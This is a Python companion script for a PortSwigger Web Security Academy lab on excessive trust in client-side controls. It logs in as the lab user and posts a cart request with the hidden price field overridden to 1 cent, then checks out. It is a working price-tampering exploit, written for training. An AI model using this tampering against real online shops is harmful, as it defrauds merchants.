#!/usr/bin/env python3
"""
Excessive trust in client-side controls
PortSwigger Web Security Academy -- Business Logic Vulnerabilities

Companion script for the writeup: 01-excessive-trust-in-client-side-controls.md

What this does:
    Logs in as wiener:peter, reads the hidden "price" field off the product
    page for the leather jacket, then adds it to the cart with that field
    overridden to 1 cent instead of the real listed price. The server trusts
    whatever price arrives in the POST body, so checkout completes well
    within the account's store credit.

Usage:
    python 01-excessive-trust-in-client-side-controls.py <lab-url>
    e.g. python 01-excessive-trust-in-client-side-controls.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx


def _get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def _login(client: httpx.Client, base: str, username: str, password: str) -> None:
    csrf = _get_csrf(client, f"{base}/login")
    client.post(f"{base}/login", data={"csrf": csrf, "username": username, "password": password})


def solve(lab_url: str) -> None:
    c = httpx.Client(follow_redirects=True, timeout=15)
    _login(c, lab_url, "wiener", "peter")

    prod_r = c.get(f"{lab_url}/product?productId=1")
    price_m = re.search(r'name="price"\s+value="(\d+)"', prod_r.text)
    original_price = price_m.group(1) if price_m else "133700"
    print(f"[*] Real price field on the product page: {original_price}")

    csrf = _get_csrf(c, f"{lab_url}/product?productId=1")
    c.post(f"{lab_url}/cart", data={
        "csrf": csrf,
        "productId": "1",
        "quantity": "1",
        "price": "1",  # override the hidden field to 1 cent
        "redir": "PRODUCT"
    })
    print("[*] Added jacket to cart with price overridden to 1 cent")

    csrf = _get_csrf(c, f"{lab_url}/cart")
    r = c.post(f"{lab_url}/cart/checkout", data={"csrf": csrf})
    print(f"[*] Checkout response status: {r.status_code}")

    check = c.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- jacket purchased for 1 cent.")
    else:
        print("[-] Not solved yet -- inspect the cart/checkout responses.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
